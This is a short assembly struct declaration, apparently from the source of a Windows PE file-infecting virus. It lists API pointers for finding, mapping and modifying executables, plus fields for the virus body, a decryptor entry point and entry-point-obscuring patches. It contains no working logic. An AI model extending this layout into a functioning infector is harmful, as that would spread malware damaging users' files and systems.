vars struct
    aLoadLibrary        dd  ? ; 0
    aCloseHandle        dd  ? ; 4
    aGetCurrentDirectory    dd  ? ; 8 
    aMultiByteToWideChar    dd  ? ; 12
    aFindFirstFile      dd  ? ; 16  
    aFindNextFile       dd  ? ; 20
    aFindClose      dd  ? ; 24
    aCreateFile             dd  ? ; 28
    aCreateFileMapping      dd  ? ; 32
    aMapViewOfFile          dd  ? ; 36
    aUnmapViewOfFile        dd  ? ; 40
    aExitProcess            dd  ? ; 44
    aGetFileSize            dd  ? ; 48
    aOutputDebugString      dd  ? ; 52
    aSfcIsFileProtected     dd  ? ; 56
    random_seed         dd  ? 
    hFile                   dd  ? 
    hFileMap                dd  ? 
    ptrMappedImage          dd  ? 
    ptrVirusData            dd  ? 
    ptrVirusBuffer          dd  ? ; buffer where new virus copy is created   
    ptrVirusBase            dd  ? ; pointer to virus base address in infected file 
    dwDeltaOffset           dd  ? ; 
    dwVirusSize             dd  ? ; size of virus_code + virus_data (needed for infection algo)
    dwDataSize              dd  ? ;  
    VirusEntryVa            dd  ? 
    OrigVirusEntryVa        dd  ? 
    dwRelEntryPoint         dd  ? ; Ep address relative to ptrVirusBuffer 
    ptr_sect_headers        dd  ?
    number_of_sect          dd  ?
    ptr_opt_header          dd  ?
    decryptor_ep_VA         dd  ?
    number_of_epo_patches   dd  ?
    epo_do_direct_call      dd  ?
    virus_state_flags       dd  ? 
vars ends

